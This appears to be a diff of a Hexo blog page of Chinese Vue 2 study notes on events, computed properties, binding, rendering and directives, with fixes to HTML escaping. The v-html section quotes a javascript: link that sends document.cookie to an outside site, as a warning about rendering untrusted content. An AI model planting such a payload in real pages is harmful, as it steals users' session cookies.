@@ -144,29 +144,27 @@
 <p>Vue里的数据代理:<br>vm._data就是指 实例中的data 但内部做了数据劫持<br>vm._data&#x3D;&#x3D;&#x3D;data  :true(前提是这个data放在了全局)</p>
 <p>关键的一步:把data中的数据放到vm身上一份（为了编码更方便 省略了 _data.name中的_data）</p>
 <p>整个基本原理:<br>通过Object.defineProperty()把data中的所有属性添加到vm上<br>为每一个添加到vm身上的属性添加setter和getter<br>在setter和getter内部去操作（读&#x2F;写）data中对应的属性</p>
-<h4 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理:"></a>事件处理:</h4><p>事件里面绑定的函数 （）可加可不加，但如果是插值语法必须加 如<p>{ {demo() }}&lt;&#x2F;p</p>
-<p>点击时触发: &lt;button v-on:click&#x3D;”showInfo()” &lt;&#x2F;button<br>可简写成  &lt;button @click&#x3D;”showInfo”&gt;&lt;&#x2F;button</p>
+<h4 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理:"></a>事件处理:</h4><p>事件里面绑定的函数 （）可加可不加，但如果是插值语法必须加 如&lt; p&gt;{ {demo() }}&lt; &#x2F;p&gt;</p>
+<p>点击时触发: &lt; button v-on:click&#x3D;”showInfo()” &lt; &#x2F;button&gt;<br>可简写成  &lt; button @click&#x3D;”showInfo”&gt;&lt; &#x2F;button&gt;</p>
 <p>new Vue({<br>el:’#root’<br>document.getElementById(“root”)<br>data:{<br>name:’尚硅谷’<br>},<br>methods:{<br>showInfo(a){<br> 此处的this是vm（Vue实例对象） 这里的第一个参数（当没有传入参数的时候）是事件对象 可以获取a.target.innerText<br>}</p>
-<p>如果想传入参数并且不会丢失event<br>&lt;button @click&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button  参数位置可以互换，不影响<br>}</p>
-<h4 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符:"></a>事件修饰符:</h4><p>阻止事件默认行为:<br>methods:{<br>showInfo(event){<br>event.preventDefault();<br>}<br>或者<br>&lt;button @click.prevent&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button  (.prevent对点击事件click进行修饰)</p>
-<p>阻止事件冒泡:<br>methods:{<br>showInfo(event){<br>event.stopPropagation();<br>}<br>或者<br>&lt;button @click.stop&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
-<p>.once事件只触发一次<br>&lt;button @click.once&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
-<p>.capture 事件的捕获模式 (事件开始从外往里面开始执行)<br>&lt;button @click.capture&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
-<p>.self只有event.target是当前操作的元素对象时才触发事件（触发事件的前提条件是   事件对象为当前元素 包含不算）<br>&lt;button @click.self&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
+<p>如果想传入参数并且不会丢失event<br>&lt; button @click&#x3D;”showInfo(1,$event)”&gt;&lt; &#x2F;button&gt;  参数位置可以互换，不影响<br>}</p>
+<h4 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符:"></a>事件修饰符:</h4><p>阻止事件默认行为:<br>methods:{<br>showInfo(event){<br>event.preventDefault();<br>}<br>或者<br>&lt; button @click.prevent&#x3D;”showInfo(1,$event)”&gt;&lt; &#x2F;button&gt;  (.prevent对点击事件click进行修饰)</p>
+<p>阻止事件冒泡:<br>methods:{<br>showInfo(event){<br>event.stopPropagation();<br>}<br>或者<br>&lt; button @click.stop&#x3D;”showInfo(1,$event)”&gt;&lt; &#x2F;button&gt; </p>
+<p>.once事件只触发一次<br>&lt; button @click.once&#x3D;”showInfo(1,$event)”&gt;&lt; &#x2F;button&gt; </p>
+<p>.capture 事件的捕获模式 (事件开始从外往里面开始执行)<br>&lt; button @click.capture&#x3D;”showInfo(1,$event)”&gt;&lt; &#x2F;button&gt; </p>
+<p>.self只有event.target是当前操作的元素对象时才触发事件（触发事件的前提条件是   事件对象为当前元素 包含不算）<br>&lt; button @click.self&#x3D;”showInfo(1,$event)”&gt;&lt; &#x2F;button&gt; </p>
 <p>.passive（优先响应默认行为） 事件的默认行为会立即执行 无需等待事件回调函数执行完毕</p>
 <p>&lt; div @scroll&#x3D;’demo’&gt;&lt; &#x2F;div&gt;  滚动条 滚动时触发</p>
-<div @wheel='demo'></div>   鼠标的滚轮 滚动时触发
-当触发鼠标滚轮时 会执行对应函数  等函数中代码执行完后(这里如果出现一些很棒花时间的循环语句，会造成页面卡顿 ) 才会触发默认行为（滚动台向上/下移动一丢丢）
-
+<p>&lt; div @wheel&#x3D;’demo’&gt;&lt; &#x2F;div&gt;   鼠标的滚轮 滚动时触发<br>当触发鼠标滚轮时 会执行对应函数  等函数中代码执行完后(这里如果出现一些很棒花时间的循环语句，会造成页面卡顿 ) 才会触发默认行为（滚动台向上&#x2F;下移动一丢丢）</p>
 <p>&lt; div @wheel.passive&#x3D;’demo’&gt;&lt; &#x2F;div&gt;  可以解决卡顿问题 （scroll事件本事就是先响应默认行为)</p>
 <p>v-model的三个修饰符:<br> .number: 让文本框中得到的结果为数字型，而不是默认的字符串<br>&lt; input type&#x3D;’number’ v-model.number&#x3D;’userInfo.age’&gt; </p>
 <p>.lazy:失去焦点时再收集<br>&lt; textarea v-model.lazy&#x3D;’userInfo.other’&gt;</p>
 <p>.trim: 去掉首位空格</p>
 <h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件:"></a>键盘事件:</h4><p>@keydowm :按下 没有抬起来<br>@keyup:按下 并且松手了</p>
-<p>&lt;input @keyup.enter&#x3D;’’&gt;<br>松手后并且回车了才触发 这里的enter为按键别名</p>
+<p>&lt; input @keyup.enter&#x3D;’’&gt;<br>松手后并且回车了才触发 这里的enter为按键别名</p>
 <p>类似的按键别名还有:<br>delete:删除或退格<br>esc:退出<br>space:空格<br>tab:换行(特殊 必须配合keydown去使用 本身就可以移出焦点)<br>up:上<br>down:下<br>left：做<br>right:右</p>
 <p>如果时多个单词组成的别名:<br>如CapsLock  需要用-分开<br>&lt;input @keyup.caps-lock&#x3D;’’&gt;</p>
-<p>系统修饰键:(用法特殊)<br>ctrl alt shift meta<br>&lt;input @keyup.ctrl&#x3D;’’&gt;<br>按下修饰键的同时 再按下其他键 随后释放其他键 事件才被触发<br>需要  如同时按下ctrl +y  然后松开 才会触发 ctrl+i 也行 …<br>还可以 指定其他键<br>&lt;input @keyup.ctrl.y&#x3D;’’&gt; </p>
+<p>系统修饰键:(用法特殊)<br>ctrl alt shift meta<br>&lt; input @keyup.ctrl&#x3D;’’&gt;<br>按下修饰键的同时 再按下其他键 随后释放其他键 事件才被触发<br>需要  如同时按下ctrl +y  然后松开 才会触发 ctrl+i 也行 …<br>还可以 指定其他键<br>&lt; input @keyup.ctrl.y&#x3D;’’&gt; </p>
 <h4 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性:"></a>计算属性:</h4><p>底层原理:接住了Object.definedProperty()里面的getter和setter<br>拿着已经写完的属性（data中的数据）去加工去计算，然后生成一个全新的属性</p>
 <p>data里面放的是是属性<br>computed里面放的是计算属性（也在vm身上 和data中的数据一样可直接写在插值语法中）</p>
 <p>当第一次读取计算属性的值时  会被缓存起来   后面再访问就会走缓存路线<br>对比之下 methods读取几次就会执行几次 没有任何缓存</p>
@@ -176,9 +174,7 @@
 <p>}</p>
 <p>}</p>
 <p>}</p>
-<p></p
-
-
+<p>&lt; p&gt;&lt; &#x2F;p&gt;</p>
 <p>计算属性简写形式（如果确定了只读 不改）</p>
 <p>computed:{<br>fullName(){ 这个函数会直接当成get函数用<br>return  this.firstName+’-‘+this.lastName<br>},</p>
 <h4 id="监视-侦听-属性"><a href="#监视-侦听-属性" class="headerlink" title="监视(侦听)属性:"></a>监视(侦听)属性:</h4><p>对比计算属性:<br>计算属性时不能开启异步任务来维护数据，而监视属性可以（不靠return 语句来返回数据）<br>computed能完成的功能，watch都能完成,watch能完成的功能，computed不一定能完成(如watch可以异步操作 ：setTimeout(function(){})，1000)</p>
@@ -199,63 +195,29 @@
 <p>immediate:true,<br>handler(newValue,oldValue){<br>}</p>
 <p>})<br>简写成<br>vm.$watch(‘isCold’,function(newValue,oldValue){</p>
 <p>})</p>
-<h4 id="绑定class样式"><a href="#绑定class样式" class="headerlink" title="绑定class样式:"></a>绑定class样式:</h4><div class='basic' :class='a' 动态样式绑定 适用于类名不确定
-
+<h4 id="绑定class样式"><a href="#绑定class样式" class="headerlink" title="绑定class样式:"></a>绑定class样式:</h4><p>&lt; div class&#x3D;’basic’ :class&#x3D;’a’ 动态样式绑定 适用于类名不确定</p>
 <p>data:{<br>a:’normal’<br>}</p>
 <p>style<br>.normal{<br>…<br>}</p>
-<p>或者 数组写法 &lt;div class&#x3D;’basic’ :class&#x3D;’arr’  适用于 个数不缺名 名字不确定</p>
+<p>或者 数组写法 &lt; div class&#x3D;’basic’ :class&#x3D;’arr’  适用于 个数不缺名 名字不确定</p>
 <p>data:{<br>arr:[‘atguigu1’,’atguigu2’,’atguigu3’]<br>}</p>
 <p>style<br>.atguigu1{}<br>.atguigu2{}</p>
-<p>也可以</p>
-<div class='basic' :class='[a,b,c]'
-data:{
-a:'atguigu1',
-b:'atguigu2'
-或者 对象写法 适用于个数确定 名字也确定
-<div class='basic' :class='classObj'
-data:{
-classObj:{
-atguigu1:false,
-atguigu2:false
-}
-也可以
-<div class='basic' :class='{atguigu1:false,atguigu2:false}'>
-
-
-<h4 id="绑定style样式"><a href="#绑定style样式" class="headerlink" title="绑定style样式:"></a>绑定style样式:</h4><p style='{fontSize:fsize+"px"}'
-
-<p>对象写法<br>data:{<br>fsize:40<br>} 通常改成</p>
-<p style='styleObj'>
-
-<p>data:{<br>styleObj:{<br>fontSize:’40px’<br>}<br>}<br>或者数组形式</p>
-<p style='[styleObj,styleObj2]'
-
+<p>也可以<br>&lt; div class&#x3D;’basic’ :class&#x3D;’[a,b,c]’<br>data:{<br>a:’atguigu1’,<br>b:’atguigu2’<br>或者 对象写法 适用于个数确定 名字也确定<br>&lt; div class&#x3D;’basic’ :class&#x3D;’classObj’<br>data:{<br>classObj:{<br>atguigu1:false,<br>atguigu2:false<br>}<br>也可以<br>&lt; div class&#x3D;’basic’ :class&#x3D;’{atguigu1:false,atguigu2:false}’&gt;</p>
+<h4 id="绑定style样式"><a href="#绑定style样式" class="headerlink" title="绑定style样式:"></a>绑定style样式:</h4><p>&lt; p style&#x3D;’{fontSize:fsize+”px”}’</p>
+<p>对象写法<br>data:{<br>fsize:40<br>} 通常改成<br>&lt; p style&#x3D;’styleObj’&gt;</p>
+<p>data:{<br>styleObj:{<br>fontSize:’40px’<br>}<br>}<br>或者数组形式<br>&lt; p style&#x3D;’[styleObj,styleObj2]’</p>
 <p>data:{<br>styleObj:{<br>fontSize:’40px’<br>}，<br>styleObj2:{<br>backgroundColor:green;<br>}<br>}</p>
-<h4 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染:"></a>条件渲染:</h4><p v-show='true'> 为true时显示 为false隐藏  （底层为 调整display的值  为false时 元素节点还在）
-<p v-show='1==3'> 隐藏
-
-
-<p v-if='false'> (为false时 元素节点都会消失) (底层：通过增加 删除节点)
-<p v-else-if='false'> 
-<p v-else> （v-else后面即使有条件也无效 不需要跟任何内容）
-
+<h4 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染:"></a>条件渲染:</h4><p>&lt; p v-show&#x3D;’true’&gt; 为true时显示 为false隐藏  （底层为 调整display的值  为false时 元素节点还在）<br>&lt; p v-show&#x3D;’1&#x3D;&#x3D;3’&gt; 隐藏</p>
+<p>&lt; p v-if&#x3D;’false’&gt; (为false时 元素节点都会消失) (底层：通过增加 删除节点)<br>&lt; p v-else-if&#x3D;’false’&gt;<br>&lt; p v-else&gt; （v-else后面即使有条件也无效 不需要跟任何内容）</p>
 <p>如果有很高的切换频率，使用v-show<br>频率低的 有v-if<br>另外 v-if时有惰性的  如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染 相比之下 v-show 不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p>
 <p>template只能和v-if连用 不能和v-show一起使用<br>&lt; template v-if&#x3D;’a&#x3D;&#x3D;&#x3D;1’&gt;<br>&lt; p&gt; 123&lt; &#x2F;p&gt;<br>&lt; &#x2F;template&gt;</p>
-<h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染:"></a>列表渲染:</h4><ul
-<li v-for='p in persons' :key='p.id'> {  {p. ...}}</li 
-key的作用：让每一个li拥有了一个唯一的标识（前面只有加了: 后面才会被当成表达式处理）
-或者
-<li v-for='（p,index） in persons' :key='index'>  (把 in 换成 of也行)
-
+<h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染:"></a>列表渲染:</h4><p>&lt; ul&gt;<br>&lt; li v-for&#x3D;’p in persons’ :key&#x3D;’p.id’&gt; {  {p. …}}&lt; &#x2F;li&gt;<br>key的作用：让每一个li拥有了一个唯一的标识（前面只有加了: 后面才会被当成表达式处理）<br>或者<br>&lt; li v-for&#x3D;’（p,index） in persons’ :key&#x3D;’index’&gt;  (把 in 换成 of也行)</p>
 <p>data:{<br>persons:[{},{},{}]<br>}</p>
-<p>或者 也可以遍历对象</p>
-<li v-for='（p,k） in car' :key='k'>  (这里p 指 属性值  k表示属性名) (把 in 换成 of也行)
-
+<p>或者 也可以遍历对象<br>&lt; li v-for&#x3D;’（p,k） in car’ :key&#x3D;’k’&gt;  (这里p 指 属性值  k表示属性名) (把 in 换成 of也行)</p>
 <p>data:{<br>car：{<br>name：1，<br>price:2,<br>color:3<br>}<br>}</p>
 <p>v-for也可以遍历字符串</p>
 <p>也可以遍历次数<br>如  v-for&#x3D;’(a,b) of 5’<br>a 为 1 2 3 4 5<br>b 为 0 1 2 3 4</p>
 <h4 id="key的作用与原理"><a href="#key的作用与原理" class="headerlink" title="key的作用与原理:"></a>key的作用与原理:</h4><p>把初始数据生成虚拟dom（真实dom身上没有key,但虚拟dom身上一定会有key）(此时页面啥也没有，只是内存中出现了虚拟节点)<br>然后将虚拟dom转换为真实dom<br>用户开始输入内容，数据开始更新，出现了新的数据<br>根据新的数据，生成 新的虚拟dom</p>
-<p>然后进行虚拟dom对比算法（称为diff算法,将新的与旧的虚拟dom对比，此时依赖的就是key）（举例 ： ，&lt;li key&#x3D;’0’ 老王 20  &lt;input type&#x3D;’text’&lt;&#x2F;li’如果对比之后  如果节点中key值一样，就会拿来对比  先对比文本节点 然后对比标签节点， 如果标签名一样，标签结构一样，所有属性都一样不会去考虑文本节点一不一样，最终对比结果就是一样的  可如果文本节点不同，就会把新的虚拟dom转化为真实dom,但input元素这部分和旧的是一样的，用的是旧的虚拟dom生成的真实dom） </p>
+<p>然后进行虚拟dom对比算法（称为diff算法,将新的与旧的虚拟dom对比，此时依赖的就是key）（举例 ： ，&lt; li key&#x3D;’0’ 老王 20  &lt;input type&#x3D;’text’&lt; &#x2F;li&gt;’如果对比之后  如果节点中key值一样，就会拿来对比  先对比文本节点 然后对比标签节点， 如果标签名一样，标签结构一样，所有属性都一样不会去考虑文本节点一不一样，最终对比结果就是一样的  可如果文本节点不同，就会把新的虚拟dom转化为真实dom,但input元素这部分和旧的是一样的，用的是旧的虚拟dom生成的真实dom） </p>
 <p>使用index作为key不是一定会有问题，如果对数据进行了破坏顺序的操作（如数组中往前面加元素，会造成破坏，而往后面添加则不会，因为此时的key为数组的索引值）</p>
 <p>如果不写key,遍历时的索引值会默认最为key值</p>
 <p>key值最好用唯一标识(id,身份证号)</p>
@@ -278,7 +240,7 @@ key的作用：让每一个li拥有了一个唯一的标识（前面只有加了
 <h4 id="v-text-v-html指令"><a href="#v-text-v-html指令" class="headerlink" title="v-text,v-html指令:"></a>v-text,v-html指令:</h4><p>&lt; div v-text&#x3D;’’&gt;:</p>
 <p>渲染文本内容， 会将所有的字符串当成正常的文本去解析，即使里面有标签也不会当成标签去解析</p>
 <p>&lt; div v-html&#x3D;’str’&gt;:<br>与上面一样，但可以识别html的结构<br>v-html可以出现的危险的行为:</p>
-<p>data:{<br>str:’&lt;a href&#x3D;javaScript:location.href&#x3D;”<a target="_blank" rel="noopener" href="http://www.baidu.com/?&quot;+document.cookie&#39;&gt;">http://www.baidu.com?&quot;+document.cookie&#39;&gt;</a>…</a><br>此时点击该标签 跳转时 会将当前网站上的所有cookie(如果用户没有勾选 …only)传给 指定的百度这个网站<br>一定要在可信的内容上使用v-html<br>永远不要用在在用户提交的内容上</p>
+<p>data:{<br>str:’&lt; a href&#x3D;javaScript:location.href&#x3D;”<a target="_blank" rel="noopener" href="http://www.baidu.com/?&quot;+document.cookie&#39;&gt;">http://www.baidu.com?&quot;+document.cookie&#39;&gt;</a>…&lt; &#x2F;a&gt;<br>此时点击该标签 跳转时 会将当前网站上的所有cookie(如果用户没有勾选 …only)传给 指定的百度这个网站<br>一定要在可信的内容上使用v-html<br>永远不要用在在用户提交的内容上</p>
 <h4 id="v-cloak指令-没有值"><a href="#v-cloak指令-没有值" class="headerlink" title="v-cloak指令(没有值):"></a>v-cloak指令(没有值):</h4><p>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性<br>使用css配合v-cloak可以解决网速慢时页面展示出未经解析的模板的问题<br>&lt; h2 v-cloak&gt;…&lt;&#x2F; h2&gt;</p>
 <p>&lt; style&gt;<br>[v-cloak]:{<br>display:none;<br>}</p>
 <h4 id="v-once指令"><a href="#v-once指令" class="headerlink" title="v-once指令:"></a>v-once指令:</h4><p>v-once所在节点在初次动态渲染后，就视为静态内容了<br>以后数据的改变不会引起v-once所在结构的更新<br>&lt; h2 v-once&gt;{  {n}}&lt; &#x2F;h2&gt;<br>data:{<br>n:1<br>}</p>
@@ -346,7 +308,7 @@ key的作用：让每一个li拥有了一个唯一的标识（前面只有加了
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/25/vue2-0-3-0/" data-id="cl1dgisuh0006ngnobw1k05gt" data-title="vue2.0+3.0" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/25/vue2-0-3-0/" data-id="cl1dh2gz100063cnohjhaawy6" data-title="vue2.0+3.0" class="article-share-link">Share</a>
       
       
       
@@ -683,7 +645,7 @@ console.log(m1)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/22/ES6-11/" data-id="cl1dgisu70001ngno4o9b78lk" data-title="ES6-11" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/22/ES6-11/" data-id="cl1dh2gyq00013cno2vhf39tp" data-title="ES6-11" class="article-share-link">Share</a>
       
       
       
@@ -819,7 +781,7 @@ function hander(data){
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/17/ajax/" data-id="cl1dgisua0002ngno7t732gc6" data-title="ajax" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/17/ajax/" data-id="cl1dh2gyu00023cnog21n2xls" data-title="ajax" class="article-share-link">Share</a>
       
       
       
@@ -921,7 +883,7 @@ function hander(data){
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/25/js2/" data-id="cl1dgisug0005ngno4l9raoyr" data-title="js2" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/25/js2/" data-id="cl1dh2gz000053cnoe89g4mzh" data-title="js2" class="article-share-link">Share</a>
       
       
       
@@ -965,7 +927,7 @@ function hander(data){
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/25/%E8%AE%A1%E7%AE%97%E9%A2%98/" data-id="cl1dgisuk0008ngnock94479t" data-title="计算题" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/25/%E8%AE%A1%E7%AE%97%E9%A2%98/" data-id="cl1dh2gz300083cno5vyhfsib" data-title="计算题" class="article-share-link">Share</a>
       
       
       
@@ -1297,7 +1259,7 @@ function hander(data){
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/14/js1/" data-id="cl1dgisuf0004ngnogwo48qqn" data-title="js1" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/14/js1/" data-id="cl1dh2gyx00043cno2zs69zks" data-title="js1" class="article-share-link">Share</a>
       
       
       
@@ -1340,7 +1302,7 @@ function hander(data){
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/14/github%E5%AE%98%E7%BD%91%E5%BF%AB%E9%80%9F%E8%BF%9B%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="cl1dgisuc0003ngnohlf8f2i1" data-title="github官网快速进入的方法" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/14/github%E5%AE%98%E7%BD%91%E5%BF%AB%E9%80%9F%E8%BF%9B%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="cl1dh2gyv00033cno2ejy199l" data-title="github官网快速进入的方法" class="article-share-link">Share</a>
       
       
       
@@ -1759,7 +1721,7 @@ autocomplete="on /off"   历史记录显示与否 （也可以直接给到form �
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/11/CSS/" data-id="cl1dgistz0000ngno6b12gvdn" data-title="CSS" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/11/CSS/" data-id="cl1dh2gyi00003cnofu4ravfp" data-title="CSS" class="article-share-link">Share</a>
       
       
       
@@ -1814,7 +1776,7 @@ autocomplete="on /off"   历史记录显示与否 （也可以直接给到form �
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/11/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" data-id="cl1dgisuj0007ngno6ma7bxy9" data-title="使用hexo搭建博客" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/11/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" data-id="cl1dh2gz200073cno8gitdr5e" data-title="使用hexo搭建博客" class="article-share-link">Share</a>
       
       
       
